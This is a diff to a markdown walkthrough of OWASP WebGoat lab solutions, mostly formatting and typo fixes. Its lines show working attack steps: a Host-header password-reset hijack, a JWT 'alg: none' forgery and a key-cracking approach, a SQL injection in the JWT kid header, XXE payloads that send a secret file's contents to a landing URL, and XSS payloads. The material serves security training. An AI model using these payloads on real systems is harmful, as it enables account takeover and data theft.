@@ -415,7 +415,9 @@ Valid credentials are: **admin** and **green**, **jerry** and **orange**, **tom*
 5. 
 Read the advices.
 
-6.  
+6.
+![Warning](images/wiki_owasp_webgoat/warning.png)  Lesson number does not turn green on validation.
+
 ![Hint](images/wiki_owasp_webgoat/hint.png) Try to send a password reset link to your own account at {user}@webgoat.org, you can read this e-mail in WebWolf.  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Look at the link, can you think how the server creates this link?  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Tom clicks all the links he receives in his mailbox, you can use the landing page in WebWolf to get the reset link...  
@@ -426,7 +428,7 @@ Read the advices.
 *   Send an email to `tom@webgoat-cloud.org` and intercept the request.
 *   Change the `Host: host:webgoat_port` header to `Host: host:webwolf_port` and return a request.
 *   On **WebWolf**, go to **Incoming requests**, retrieve the variable `path` and go to the URL http://host:webgoat\_port/WebGoat/path .
-*   Change the password and validate the challenge with the latter (validation bugged).
+*   Change the password and validate the challenge with the latter.
  
 ![Password Reset 6](images/wiki_owasp_webgoat/password-reset-6.png)  
 ![Password Reset 6](images/wiki_owasp_webgoat/password-reset-6-webwolf.png)
@@ -460,7 +462,12 @@ Read the advices.
 *   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
 *   Log in as Tom on WebGoat and click on **Reset Votes**.
 *   Locate the query to `reset` in the _Network_ tab and click on _Headers_.
-*   Notice the header: `Cookie: access_token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1NjQ0MDIyNDQsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0._gPSRvB9wAAruFwaDgivXp4n5rHQFi5hTOJsVFqCkR9ZDUf3LhCgJQuTIIpTGnZIS3XWL9MHZGaExJC7XhIiXA`
+*   Notice the header: 
+```
+Cookie: access_token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1NjQ0MDIyNDQsImFkbWluIjoiZm
+Fsc2UiLCJ1c2VyIjoiVG9tIn0._gPSRvB9wAAruFwaDgivXp4n5rHQFi5hTOJsVFqCkR9ZDUf3LhCgJQ
+uTIIpTGnZIS3XWL9MHZGaExJC7XhIiXA
+```
 *   In base64, this is decoded as: `{"alg":"HS512"}.{"Iat":1564402244,"admin":"false","user":"Tom"}.signature`.
 *   Edit it to `{"alg": null}.{"Iat":1564402244,"admin":"true","user":"Tom"}.`.
 *   Re-encode it to base64 (`eyJhbGciOiBudWxsfQ==.eyJpYXQiOjE1NjQ0MDIyNDQsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ==.`).
@@ -475,7 +482,7 @@ Read the advices.
 ![Hint](images/wiki_owasp_webgoat/hint.png) Download a word list dictionary (https://github.com/first20hours/google-10000-english)  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Write a small program or use HashCat for brute forcing the token according the word list
 
-It is possible to validate this challenge with tools like **johntheripper** and https://jwt.io/, but in order to get a better understanding og the whole process, here a Python script.  
+It is possible to validate this challenge with tools like **johntheripper** and https://jwt.io/, but in order to get a better understanding of the whole process, here a Python script.  
 
 *   Isolate the signature, and reformat it correctly.
 *   Use each word of the dictionary as a key, calculate the HMAC of the initial message, convert it to base64, and compare it with the signature.
@@ -528,7 +535,7 @@ jwt_tokens_5()
 
 7.  
 ![Warning](images/wiki_owasp_webgoat/warning.png)  This challenge doesn't provide enough information to be completed. By looking into the source code, we can find the following has to be done: Make a `POST` request to http://host:port/WebGoat/JWT/refresh/login with header `Content-Type: application/json` and content `{"user":"Jerry","password":"bm5nhSkxCXZkKRy4"}` to obtain a `<jerry_refresh_token>`.   
-![Warning](images/wiki_owasp_webgoat/warning.png)  Lesson number does not turn green on validation.. 
+![Warning](images/wiki_owasp_webgoat/warning.png)  Lesson number does not turn green on validation.
 
 ![Hint](images/wiki_owasp_webgoat/hint.png) Look at the access log you will find a token there  
 ![Hint](images/wiki_owasp_webgoat/hint.png) The token from the access log is no longer valid, can you find a way to refresh it?  
@@ -552,7 +559,7 @@ jwt_tokens_5()
 
 8.  
 ![Warning](images/wiki_owasp_webgoat/warning.png)  It lacks a precision in the hints: the key is decoded as a base64 chain. Also instead of using as **kid** `hacked' UNION select 'deletingTom' from INFORMATION_SCHEMA.SYSTEM_USERS --`, you have to use `hacked' UNION select 'ZGVsZXRpbmdUb20=' from INFORMATION_SCHEMA.SYSTEM_USERS --`   
-![Warning](images/wiki_owasp_webgoat/warning.png)  Lesson number does not turn green on validation.. 
+![Warning](images/wiki_owasp_webgoat/warning.png)  Lesson number does not turn green on validation.
 
 ![Hint](images/wiki_owasp_webgoat/hint.png) Take a look at the token and specifically and the header  
 ![Hint](images/wiki_owasp_webgoat/hint.png) The 'kid' (key ID) header parameter is a hint indicating which key was used to secure the JWS  
@@ -589,7 +596,7 @@ and
 "aud":"webgoat.org","sub":"jerry@webgoat.com","username":"Tom",
 "Email":"jerry@webgoat.com","Role":["Cat"]}
 ```
-then calculate the new signature with deletingTom as the new key. Use the Python script below for example. 
+then calculate the new signature with `deletingTom` as the new key. Use the Python script below for example. 
 *   The new token is
 ```
 eyJ0eXAiOiJKV1QiLCJraWQiOiJoYWNrZWQnIFVOSU9OIHNlbGVjdCAnWkdWc1pYUnBibWRVYjIwPScg
@@ -630,7 +637,7 @@ jwt_tokens_8()
 ##### Insecure Login
 
 2.  
-![Warning](images/wiki_owasp_webgoat/warning.png)  Le numéro de leçon ne devient pas vert après validation.  Lesson number does not turn green on validation.. 
+![Warning](images/wiki_owasp_webgoat/warning.png)  Lesson number does not turn green on validation.
 
 *   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
 *   On WebGoat, click on **Log in**.
@@ -670,13 +677,13 @@ jwt_tokens_8()
 6. Although it is not a challenge, a small mistake has crept into the lesson, be careful to enter the right URL to be able to perform the test.  
   
 **attack.dtd**  
-```
+```xml
 <?xml version="1.0" encoding="UTF-8"?>  
 <!ENTITY ping SYSTEM 'http://host:port/landing?test=HelloWorld' >
 ```  
   
 **Request Body**  
-```
+```xml
 <?xml version="1.0"?>  
 <!DOCTYPE root [  
 <!ENTITY % remote SYSTEM "http://host:port/files/username/attack.dtd" >  
@@ -701,13 +708,13 @@ jwt_tokens_8()
 *   Edit the body of the query as specified below.
 
 **contents\_file.dtd**  
-```
+```xml
 <?xml version="1.0" encoding="UTF-8"?>  
 <!ENTITY % all "<!ENTITY send SYSTEM 'http://host:port/landing?%file;' >" >%all;
 ```  
   
 **Request Body**  
-```
+```xml
 <?xml version="1.0" encoding="UTF-8"?>  
 <!DOCTYPE xxe [  
 <!ENTITY % file SYSTEM "file:///home/webgoat/.webgoat-8.0.0.M25/XXE/secret.txt" >  
@@ -831,7 +838,9 @@ Send a PUT request to http://192.168.99.100:8080/WebGoat/IDOR/profile/2342388 wi
 ##### Cross Site Scripting
 
 2. 
-Main browsers have banned Javascript from the URL bar, contrary to what the suggestion say. Open the _Development Tools_, and the _Console_ tab instead. The expected answer is `Yes`.
+![Warning](images/wiki_owasp_webgoat/warning.png) Main browsers have banned Javascript from the URL bar, contrary to what the suggestion say. Open the _Development Tools_, and the _Console_ tab instead.
+
+The expected answer is `Yes`.
 
 7.  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Think about how the inputs are presumably processed by the application.  
@@ -863,7 +872,7 @@ Put `<script>alert()</script>` in the box **Enter your credit card number:**.
 ![Hint](images/wiki_owasp_webgoat/hint.png) Replace '/' with '%2F' in your URL parameters.
 
 *   Open the _Development Tools_ in the browser, and go to the _Console_ tab.
-*   Navigate to the URL [[http://host:port/WebGoat/start.mvc#test/&lt;script&gt;webgoat.customjs.phoneHome()&lt;%2Fscript&gt;](http://host:port/WebGoat/start.mvc#test/&lt;script&gt;webgoat.customjs.phoneHome()&lt;%2Fscript&gt;).
+*   Navigate to the [URL http://host:port/WebGoat/start.mvc#test/&lt;script&gt;webgoat.customjs.phoneHome()&lt;%2Fscript&gt;](http://host:port/WebGoat/start.mvc#test/&lt;script&gt;webgoat.customjs.phoneHome()&lt;%2Fscript&gt;).
 *   Retrieve the number in the function output.
 
 ![XSS 11](images/wiki_owasp_webgoat/xss-11.png)
